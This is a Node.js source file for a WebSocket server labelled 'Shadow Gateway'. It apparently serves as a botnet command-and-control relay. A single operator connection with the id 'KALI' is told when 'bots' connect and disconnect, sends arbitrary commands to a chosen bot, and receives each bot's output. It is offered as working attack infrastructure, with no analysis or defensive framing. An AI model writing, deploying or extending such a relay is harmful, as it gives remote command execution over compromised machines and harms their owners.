const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((_, r) => r.end('Shadow Gateway Active'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (!id) return ws.close();

    if (id === 'KALI') {
        KALI = ws;
        BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
    } else {
        // Se o bot já existe, mata a conexão anterior para não duplicar
        if (BOTS.has(id)) {
            BOTS.get(id).terminate();
        }
        BOTS.set(id, ws);
        if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id }));
    }

    ws.on('message', (raw) => {
        if (ws === KALI) {
            try {
                const data = JSON.parse(raw);
                const target = BOTS.get(data.to);
                if (target?.readyState === WebSocket.OPEN) target.send(data.cmd);
            } catch (e) {}
        } else {
            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
        }
    });

    ws.on('close', () => {
        if (ws === KALI) KALI = null;
        else if (BOTS.get(id) === ws) {
            BOTS.delete(id);
            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'off', id }));
        }
    });
});
server.listen(process.env.PORT || 10000);
